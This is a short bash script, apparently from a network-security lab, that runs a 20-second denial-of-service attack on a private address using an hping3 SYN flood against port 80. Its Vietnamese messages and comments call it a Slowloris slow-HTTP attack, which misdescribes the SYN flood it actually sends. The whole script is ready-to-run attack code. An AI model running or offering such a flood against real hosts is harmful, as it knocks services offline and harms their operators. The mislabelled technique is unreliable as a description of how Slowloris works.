#!/bin/bash
VICTIM="10.0.2.10"
DURATION=20

echo "Bat dau Slowloris vao $VICTIM trong $DURATION giay..."
# SYN flood cham (1 goi / 1ms = 1000 pps) — mo phong slow HTTP attack
timeout $DURATION hping3 -S -p 80 -i u1000 $VICTIM
echo "Hoan tat kich ban Slowloris!"